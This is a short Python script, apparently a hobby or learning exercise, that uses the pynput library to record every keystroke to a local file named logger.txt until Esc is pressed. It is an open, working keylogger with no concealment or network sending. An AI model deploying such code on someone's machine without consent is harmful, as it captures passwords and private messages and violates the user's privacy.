from pynput.keyboard import Key, Listener

log_file = "logger.txt" # file name to save key strokes
keys = []               
count = 0

def onPress(key):       
    global keys, count

    keys.append(key)
    count += 1
    # print(keys)

    if count >= 1:
        writer(keys)
        keys = []
        count = 0

def onRelease(key):         # whenever "esc" key is pressed the program will be terminated 
    if key == Key.esc:
        return False

def writer(key_strokes):
    with open(log_file, 'a') as logger:
        for i in key_strokes:
            words = str(i).replace("'","")

            if words.find("space") > 0:     # whenever there is space it writes data in new line
                logger.write('\n')
                logger.close()

            elif words.find("Key") == -1:   # it ignores the other key naming (eg. key.space)
                logger.write(words)
                logger.close()

if __name__ == '__main__':

    with Listener(on_press=onPress, on_release=onRelease) as l:     # it listens for key strokes and send them to the functions
        l.join()                                
